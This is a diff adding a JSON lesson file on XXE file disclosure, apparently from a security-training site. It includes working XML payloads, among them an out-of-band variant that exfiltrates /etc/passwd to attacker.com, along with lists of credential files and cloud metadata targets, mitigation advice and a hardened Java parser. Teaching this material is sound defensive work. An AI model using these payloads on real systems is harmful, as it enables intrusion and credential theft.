@@ -1,0 +1,130 @@
+{
+  "id": "file-disclosure",
+  "category": "attack-vectors",
+  "title": "File Disclosure via XXE",
+  "description": "Using XXE vulnerabilities to read arbitrary files from the server's filesystem, including sensitive configuration files, credentials, and source code.",
+  "severity": "critical",
+  "cvssScore": 9.1,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "File disclosure is the most common and impactful XXE exploitation technique. By defining external entities that reference local files using the file:// URI scheme, attackers can force XML parsers to read and disclose sensitive files from the server's filesystem.\n\n**Impact:**\n• Read application source code (credentials, API keys)\n• Access configuration files (database passwords, secrets)\n• Retrieve system files (/etc/passwd, /etc/shadow)\n• Read deployment keys (SSH keys, certificates)\n• Access application logs (session tokens, user data)\n• Read cloud metadata (AWS credentials via 169.254.169.254)\n\n**Common Target Files:**\nLinux: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa, /proc/self/environ\nWindows: C:\\windows\\win.ini, C:\\boot.ini, web.config, appsettings.json\nApplication: .env, config.php, application.properties, database.yml"
+    },
+    {
+      "id": "basic-disclosure",
+      "title": "Basic File Disclosure Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
+        "isVulnerable": true,
+        "filename": "basic-file-disclosure.xml"
+      }
+    },
+    {
+      "id": "windows-disclosure",
+      "title": "Windows File Disclosure",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Alternative Windows paths -->\n<!-- file:///c:/boot.ini -->\n<!-- file:///c:/windows/system32/drivers/etc/hosts -->\n<!-- file:///c:/inetpub/wwwroot/web.config -->",
+        "isVulnerable": true,
+        "filename": "windows-disclosure.xml"
+      }
+    },
+    {
+      "id": "path-traversal",
+      "title": "Path Traversal Techniques",
+      "type": "text",
+      "content": "When the application restricts file paths or runs from a specific directory, use path traversal:\n\n**Relative Path Traversal:**\n• file://../../etc/passwd\n• file://../../../windows/win.ini\n• file://../../../../var/www/html/config.php\n\n**Absolute Paths:**\nAlways try absolute paths first as they're more reliable:\n• Linux: file:///etc/passwd (three slashes)\n• Windows: file:///c:/windows/win.ini or file://c:\\windows\\win.ini\n\n**UNC Paths (Windows):**\nOn Windows, UNC paths may work:\n• file://\\\\\\\\server\\\\share\\\\file.txt\n• Can potentially access network shares"
+    },
+    {
+      "id": "blind-disclosure",
+      "title": "Blind File Disclosure (Out-of-Band)",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Initial XML payload -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">\n  %remote;\n]>\n<root/>\n\n<!-- xxe.dtd on attacker server -->\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>\">\n%eval;\n%exfil;\n\n<!-- Server receives HTTP request with file content:\nGET /log?data=root:x:0:0:root:/root:/bin/bash... -->",
+        "isVulnerable": true,
+        "filename": "blind-disclosure.xml"
+      }
+    },
+    {
+      "id": "php-wrapper",
+      "title": "PHP Wrapper for Binary Files",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Returns base64-encoded file content:\ncm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA...\n\nDecode with: echo \"<base64>\" | base64 -d -->\n\n<!-- Useful for binary files: -->\n<!-- php://filter/convert.base64-encode/resource=/var/www/html/image.png -->\n<!-- php://filter/convert.base64-encode/resource=/home/user/.ssh/id_rsa -->",
+        "isVulnerable": true,
+        "filename": "php-wrapper.xml"
+      }
+    },
+    {
+      "id": "special-files",
+      "title": "Special Files and Locations",
+      "type": "text",
+      "content": "**Linux Targets:**\n\n/etc/passwd - User account information\n/etc/shadow - Hashed passwords (requires root)\n/proc/self/environ - Environment variables (may contain secrets)\n/proc/self/cmdline - Command line arguments\n/proc/net/tcp - Network connections\n~/.bash_history - Command history\n~/.ssh/id_rsa - SSH private key\n~/.aws/credentials - AWS credentials\n\n**Windows Targets:**\n\nC:\\\\windows\\\\win.ini - System configuration\nC:\\\\boot.ini - Boot configuration\nC:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts - DNS mappings\nC:\\\\inetpub\\\\wwwroot\\\\web.config - IIS configuration\n\n**Application Files:**\n\n.env - Environment variables (Laravel, Node.js)\nconfig/database.yml - Rails database config\nappsettings.json - .NET Core configuration\napplication.properties - Spring Boot config\nwp-config.php - WordPress database credentials\n\n**Cloud Metadata:**\n\nAWS: http://169.254.169.254/latest/meta-data/\nGoogle: http://metadata.google.internal/computeMetadata/v1/\nAzure: http://169.254.169.254/metadata/instance"
+    },
+    {
+      "id": "error-based",
+      "title": "Error-Based File Disclosure",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % eval \"<!ENTITY &#x26;#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n  %eval;\n  %error;\n]>\n<root/>",
+        "isVulnerable": true,
+        "filename": "error-based-disclosure.xml"
+      }
+    },
+    {
+      "id": "error-explanation",
+      "title": "Error-Based Technique Explanation",
+      "type": "text",
+      "content": "Error-based file disclosure works when:\n• Application doesn't display entity expansion output\n• Error messages are returned to user\n• File content appears in error message\n\nThe technique:\n1. Read target file into %file entity\n2. Reference %file in a path that will cause error\n3. Parser tries to access invalid path containing file content\n4. Error message includes the attempted path (with file content)\n5. Attacker sees file content in error message\n\nExample error:\n\"java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash (No such file or directory)\"\n\nThe file content appears in the error path!"
+    },
+    {
+      "id": "limitations",
+      "title": "File Disclosure Limitations",
+      "type": "text",
+      "content": "**XML Special Characters:**\nFiles containing XML special characters may break parsing:\n• < > & \" ' cause XML parse errors\n• Binary files often contain these characters\n• Solution: Use PHP wrappers (base64 encoding) or OOB exfiltration\n\n**File Size:**\n• Very large files may cause parser timeout/memory errors\n• Some parsers limit entity expansion size\n• Target specific configuration files (usually small)\n\n**File Permissions:**\n• Can only read files accessible to web server user\n• Linux: typically www-data, apache, nginx user\n• Windows: typically IIS AppPool identity\n• Cannot read root-only files unless app runs as root (bad practice)\n\n**File Encoding:**\n• Non-UTF-8 files may cause encoding errors\n• Use base64 encoding for binary files\n• Some parsers reject invalid UTF-8 sequences"
+    },
+    {
+      "id": "detection",
+      "title": "Detection and Mitigation",
+      "type": "text",
+      "content": "**Detection Indicators:**\n\n1. **Code Review:**\n   • XML parsers without XXE protections\n   • file:// URI scheme in entity definitions\n   • Display of parsed XML content to users\n\n2. **Runtime Detection:**\n   • Unexpected file access by web server process\n   • File read operations during XML parsing\n   • Access to sensitive files from web application\n\n3. **Log Monitoring:**\n   • File access attempts in application logs\n   • Parse errors referencing system files\n   • Unusual file I/O patterns\n\n**Mitigation:**\n\n1. **Disable External Entities** (Primary defense)\n2. **Disable DTD Processing** (Strongest protection)\n3. **Input Validation** (Reject DOCTYPE)\n4. **Least Privilege** (Limit file access permissions)\n5. **Network Segmentation** (Prevent outbound connections)\n6. **File Access Controls** (Use chroot, containers)\n7. **Monitoring** (Alert on sensitive file access)"
+    },
+    {
+      "id": "secure-example",
+      "title": "Secure Parser Configuration",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\n\npublic class SecureXMLParser {\n    public Document parseXML(String xmlData) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        \n        // STRONGEST: Completely disable DOCTYPE (prevents all XXE)\n        factory.setFeature(\n            \"http://apache.org/xml/features/disallow-doctype-decl\",\n            true\n        );\n        \n        // If DOCTYPE needed, disable external entities\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-general-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-parameter-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://apache.org/xml/features/nonvalidating/load-external-dtd\",\n            false\n        );\n        \n        factory.setXIncludeAware(false);\n        factory.setExpandEntityReferences(false);\n        \n        DocumentBuilder builder = factory.newDocumentBuilder();\n        return builder.parse(new ByteArrayInputStream(xmlData.getBytes()));\n    }\n}",
+        "isVulnerable": false,
+        "filename": "SecureXMLParser.java"
+      }
+    }
+  ],
+  "relatedTopics": ["classic-xxe", "blind-xxe", "parameter-entities", "ssrf"],
+  "references": [
+    {
+      "title": "OWASP XXE Prevention",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+    },
+    {
+      "title": "PortSwigger XXE File Disclosure",
+      "url": "https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files"
+    },
+    {
+      "title": "CWE-611",
+      "url": "https://cwe.mitre.org/data/definitions/611.html"
+    }
+  ]
+}
